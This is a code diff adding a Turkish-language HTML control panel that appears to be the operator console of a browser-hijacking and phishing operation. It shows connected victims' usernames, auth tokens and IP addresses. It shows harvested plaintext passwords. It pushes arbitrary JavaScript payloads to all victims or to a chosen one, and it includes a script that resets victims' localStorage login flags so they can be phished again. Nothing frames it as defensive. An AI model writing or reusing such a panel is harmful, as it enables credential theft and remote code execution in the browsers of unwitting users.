@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Kontrol Paneli</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        button { margin: 5px; padding: 5px 10px; }
+        table { border-collapse: collapse; width: 100%; margin-top: 20px; }
+        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+        th { background-color: #f2f2f2; }
+    </style>
+</head>
+<body>
+    <h1>HTTP Kontrol Paneli</h1>
+    <h2>Payload Gönder</h2>
+    <select id="presetPayloads">
+        <option value='alert("Merhaba! Bu bir testtir.");'>Alert: Merhaba!</option>
+        <option value='console.log("Test logu");'>Console Log: Test</option>
+        <option value='alert("Hata!");'>Alert: Hata!</option>
+    </select>
+    <button onclick="sendPresetPayload()">Seçili Payload’u Tümüne Gönder</button>
+    <br>
+    <textarea id="customPayload" rows="4" cols="50" placeholder="Özel payload girin..."></textarea>
+    <br>
+    <input id="payloadName" type="text" placeholder="Payload ismi girin..." style="margin: 5px;">
+    <button onclick="savePayload()">Payload’u Kaydet</button>
+    <button onclick="sendCustomPayload()">Özel Payload’u Tümüne Gönder</button>
+    <br>
+    <h3>Kullanıcıya Özel Gönderim</h3>
+    <select id="targetUsername">
+        <option value="">Kullanıcı Seçin</option>
+    </select>
+    <button onclick="sendPresetToSpecificUser()">Seçili Payload’u Gönder</button>
+    <button onclick="sendCustomToSpecificUser()">Özel Payload’u Gönder</button>
+    <button onclick="resetSpecificUser()">Seçili Kullanıcıyı Resetle</button>
+
+    <h2 id="clientsHeader">Bağlı İstemciler</h2>
+    <table id="clientsTable">
+        <thead>
+            <tr>
+                <th>Kullanıcı Adı</th>
+                <th>Auth Token</th>
+                <th>IP Adresi</th>
+                <th>Son Görülme</th>
+            </tr>
+        </thead>
+        <tbody id="clientsList"></tbody>
+    </table>
+
+    <h2>Kayıtlı Kullanıcı Adı Şifre Bilgileri</h2>
+    <table id="credentialsTable">
+        <thead>
+            <tr>
+                <th>Kullanıcı Adı</th>
+                <th>Şifre</th>
+                <th>Beni Hatırla</th>
+                <th>Kayıt Zamanı</th>
+            </tr>
+        </thead>
+        <tbody id="credentialsList"></tbody>
+    </table>
+
+    <script>
+        async function sendPresetPayload() {
+            const code = document.getElementById('presetPayloads').value;
+            await fetch(`/update?code=${encodeURIComponent(code)}`);
+            alert('Preset payload tümüne gönderildi');
+        }
+
+        async function sendCustomPayload() {
+            const code = document.getElementById('customPayload').value;
+            if (!code) return alert('Payload boş olamaz!');
+            await fetch(`/update?code=${encodeURIComponent(code)}`);
+            alert('Özel payload tümüne gönderildi');
+        }
+
+        async function sendPresetToSpecificUser() {
+            const code = document.getElementById('presetPayloads').value;
+            const username = document.getElementById('targetUsername').value;
+            if (!username) return alert('Lütfen bir kullanıcı seçin!');
+            await fetch(`/update?code=${encodeURIComponent(code)}&username=${encodeURIComponent(username)}`);
+            alert(`Preset payload ${username}’a gönderildi`);
+        }
+
+        async function sendCustomToSpecificUser() {
+            const code = document.getElementById('customPayload').value;
+            const username = document.getElementById('targetUsername').value;
+            if (!code) return alert('Payload boş olamaz!');
+            if (!username) return alert('Lütfen bir kullanıcı seçin!');
+            await fetch(`/update?code=${encodeURIComponent(code)}&username=${encodeURIComponent(username)}`);
+            alert(`Özel payload ${username}’a gönderildi`);
+        }
+
+        async function resetSpecificUser() {
+            const username = document.getElementById('targetUsername').value;
+            if (!username) return alert('Lütfen bir kullanıcı seçin!');
+            const resetCode = `(function(){localStorage.removeItem('hasLoggedOut');localStorage.removeItem('payloadDone');localStorage.removeItem('loginAttempts');})();`;
+            await fetch(`/update?code=${encodeURIComponent(resetCode)}&username=${encodeURIComponent(username)}`);
+            alert(`${username} resetlendi`);
+        }
+
+        async function savePayload() {
+            const name = document.getElementById('payloadName').value;
+            const code = document.getElementById('customPayload').value;
+            if (!name || !code) return alert('İsim ve payload boş olamaz!');
+            await fetch(`/save-payload?name=${encodeURIComponent(name)}&code=${encodeURIComponent(code)}`);
+            alert(`Payload "${name}" olarak kaydedildi`);
+            updatePresetPayloads();
+        }
+
+        async function updatePresetPayloads() {
+            const response = await fetch('/get-saved-payloads');
+            const payloads = await response.json();
+            const select = document.getElementById('presetPayloads');
+            select.innerHTML = `
+                <option value='alert("Merhaba! Bu bir testtir.");'>Alert: Merhaba!</option>
+                <option value='console.log("Test logu");'>Console Log: Test</option>
+                <option value='alert("Hata!");'>Alert: Hata!</option>
+            `;
+            payloads.forEach(payload => {
+                const option = document.createElement('option');
+                option.value = payload.code;
+                option.text = payload.name;
+                select.appendChild(option);
+            });
+        }
+
+        async function updateClientsList() {
+            const select = document.getElementById('targetUsername');
+            const currentSelection = select.value;
+
+            const response = await fetch('/clients');
+            const clients = await response.json();
+            const tbody = document.getElementById('clientsList');
+            tbody.innerHTML = '';
+            select.innerHTML = '<option value="">Kullanıcı Seçin</option>';
+
+            clients.forEach(client => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${client.username}</td>
+                    <td>${client.authToken}</td>
+                    <td>${client.ipAddress}</td>
+                    <td>${client.lastSeen}</td>
+                `;
+                tbody.appendChild(row);
+
+                const option = document.createElement('option');
+                option.value = client.username;
+                option.text = client.username;
+                select.appendChild(option);
+            });
+
+            if (currentSelection && select.querySelector(`option[value="${currentSelection}"]`)) {
+                select.value = currentSelection;
+            }
+
+            const clientsHeader = document.getElementById('clientsHeader');
+            clientsHeader.textContent = `Bağlı İstemciler (${clients.length})`;
+        }
+
+        async function updateCredentialsList() {
+            const response = await fetch('/get-credentials');
+            const credentials = await response.json();
+            const tbody = document.getElementById('credentialsList');
+            tbody.innerHTML = '';
+            credentials.forEach(cred => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${cred.username}</td>
+                    <td>${cred.password}</td>
+                    <td>${cred.remember ? 'Evet' : 'Hayır'}</td>
+                    <td>${cred.timestamp}</td>
+                `;
+                tbody.appendChild(row);
+            });
+        }
+
+        setInterval(updateClientsList, 5000);
+        setInterval(updateCredentialsList, 5000);
+        updateClientsList();
+        updatePresetPayloads();
+        updateCredentialsList();
+    </script>
+</body>
+</html>
